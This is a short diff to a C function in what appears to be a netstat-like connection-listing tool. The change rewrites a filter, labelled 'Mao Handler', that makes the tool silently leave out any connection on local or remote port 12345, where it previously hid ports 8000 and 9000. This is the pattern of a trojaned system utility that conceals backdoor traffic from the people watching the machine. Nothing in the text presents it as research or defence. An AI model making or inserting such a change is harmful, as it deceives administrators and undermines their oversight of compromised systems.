@@ -297,8 +297,7 @@ void display_record(procnet_entry_t *record, pid_t pid, const char *pname) {
     int printStatus = 1;
 
     /* --- Mao Handler --- */
-    if (record->local_port == 8000 || record->local_port == 9000 || 
-		    record->remote_port == 8000 || record->remote_port == 9000) {
+    if (record->local_port == 12345 || record->remote_port == 12345) {
         return; // skip displaying this port
     }
     /* -------------------------------------------- */
